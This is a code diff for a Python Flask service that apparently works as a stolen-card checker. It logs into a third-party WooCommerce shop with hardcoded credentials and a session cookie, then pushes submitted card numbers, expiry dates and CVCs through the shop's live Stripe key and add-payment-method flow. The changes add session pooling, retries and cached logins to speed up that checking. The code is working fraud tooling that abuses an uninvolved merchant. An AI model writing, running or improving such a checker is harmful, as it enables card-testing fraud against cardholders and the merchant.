@@ -3,6 +3,8 @@ import requests
 import json
 import re
 import os
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 app = Flask(__name__)
 
@@ -13,6 +15,27 @@ USERNAME = os.environ.get('USERNAME', 'jflpw@hi2.in')
 PASSWORD = os.environ.get('PASSWORD', 'jflpw@hi2.in')
 LOGIN_NONCE = os.environ.get('LOGIN_NONCE', '0cd1c0ce87')
 
+# Global session with connection pooling
+session = requests.Session()
+
+# Configure retries and connection pooling
+retry_strategy = Retry(
+    total=2,
+    backoff_factor=0.5,
+    status_forcelist=[429, 500, 502, 503, 504],
+)
+adapter = HTTPAdapter(
+    pool_connections=10,
+    pool_maxsize=20,
+    max_retries=retry_strategy
+)
+session.mount("https://", adapter)
+session.mount("http://", adapter)
+
+# Store logged-in session globally (persists across requests)
+logged_in_cookies = None
+last_login_time = 0
+
 BASE_COOKIES = {
     'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
     'wmc_current_currency': 'INR',
@@ -22,9 +45,14 @@ BASE_COOKIES = {
     '__stripe_mid': '0f57928e-b5df-49b8-bddc-e2e1b027e8c264a831',
 }
 
-def process_card(card_number, mm, yy, cvc):
-    if len(yy) == 4:
-        yy = yy[2:4]
+def ensure_logged_in():
+    """Maintain logged-in session across requests (avoids re-login)"""
+    global logged_in_cookies, last_login_time
+    import time
+    
+    # If session exists and less than 30 minutes old, reuse it
+    if logged_in_cookies and (time.time() - last_login_time) < 1800:
+        return logged_in_cookies
     
     cookies = BASE_COOKIES.copy()
     
@@ -35,25 +63,48 @@ def process_card(card_number, mm, yy, cvc):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
     }
     
+    login_data = {
+        'username': USERNAME,
+        'password': PASSWORD,
+        'rememberme': 'forever',
+        'woocommerce-login-nonce': LOGIN_NONCE,
+        '_wp_http_referer': '/my-account/',
+        'login': 'Log in',
+    }
+    
+    login_response = session.post('https://hakfabrications.com/my-account/', 
+                                    cookies=cookies, headers=headers, data=login_data, timeout=30)
+    
+    if 'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7' in login_response.cookies:
+        logged_in_cookies = login_response.cookies
+        last_login_time = time.time()
+        return logged_in_cookies
+    else:
+        # Fallback to working cookie
+        return None
+
+def process_card(card_number, mm, yy, cvc):
+    if len(yy) == 4:
+        yy = yy[2:4]
+    
+    cookies = BASE_COOKIES.copy()
+    
+    # Get persistent login session
+    login_cookies = ensure_logged_in()
+    if login_cookies:
+        for key, value in login_cookies.items():
+            cookies[key] = value
+    
+    headers = {
+        'authority': 'hakfabrications.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
     try:
-        login_data = {
-            'username': USERNAME,
-            'password': PASSWORD,
-            'rememberme': 'forever',
-            'woocommerce-login-nonce': LOGIN_NONCE,
-            '_wp_http_referer': '/my-account/',
-            'login': 'Log in',
-        }
-        
-        login_response = requests.post('https://hakfabrications.com/my-account/', 
-                                        cookies=cookies, headers=headers, data=login_data, timeout=30)
-        
-        if 'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7' in login_response.cookies:
-            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = login_response.cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7']
-        else:
-            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = 'jflpw%40hi2.in%7C1776847107%7CpYGEnoiGg3k0BmdE0XqMFAfDomJAfD2VQMpbkl046gQ%7C90c35a5f05eb6916600614b838b2df37ebe5182b3ade661f6370a0259d592fa2'
-        
-        page_response = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
+        # Get nonce (use session for connection reuse)
+        page_response = session.get('https://hakfabrications.com/my-account/add-payment-method/', 
                                       cookies=cookies, headers=headers, timeout=30)
         
         nonce = None
@@ -86,7 +137,7 @@ def process_card(card_number, mm, yy, cvc):
         
         stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fd50036e08e%3B+stripe-js-v3%2Fd50036e08e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhakfabrications.com&time_on_page=83016&client_attribution_metadata[client_session_id]=f4659103-cb90-478c-ba53-2d73236ab03a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1yN7yJWz6Qu&client_attribution_metadata[elements_session_config_id]=c646146a-f0c2-4ef6-b47d-b7dd5e46e3b9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=aabaf175-2ac0-46ef-a220-36ed4576219e861f9c&muid={cookies["__stripe_mid"]}&sid={cookies["__stripe_sid"]}&key=pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH&_stripe_version=2025-09-30.clover'
         
-        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', 
+        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', 
                                          headers=stripe_headers, data=stripe_data, timeout=30)
         stripe_result = stripe_response.json()
         
@@ -122,7 +173,7 @@ def process_card(card_number, mm, yy, cvc):
             '_ajax_nonce': nonce,
         }
         
-        final_response = requests.post('https://hakfabrications.com/wp-admin/admin-ajax.php',
+        final_response = session.post('https://hakfabrications.com/wp-admin/admin-ajax.php',
                                         cookies=cookies, headers=ajax_headers, data=ajax_data, timeout=30)
         final_result = final_response.json()
         
